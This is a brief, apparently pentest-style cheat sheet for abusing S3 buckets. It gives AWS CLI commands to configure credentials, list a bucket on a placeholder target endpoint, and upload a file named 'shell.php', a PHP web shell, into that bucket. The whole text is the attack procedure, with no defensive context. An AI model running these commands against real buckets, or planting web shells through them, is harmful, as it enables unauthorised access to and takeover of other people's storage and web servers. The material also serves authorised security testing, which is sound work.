Set up the AWS CLI installation?

```sh
aws configure
```

List all of the S3 buckets

```sh
aws --endpoint-url=http://s3.target.com s3 ls s3://target.com
```

Upload file on S3 buckets

```sh
aws --endpoint-url=http://s3.target.com s3 cp shell.php s3://target.com
```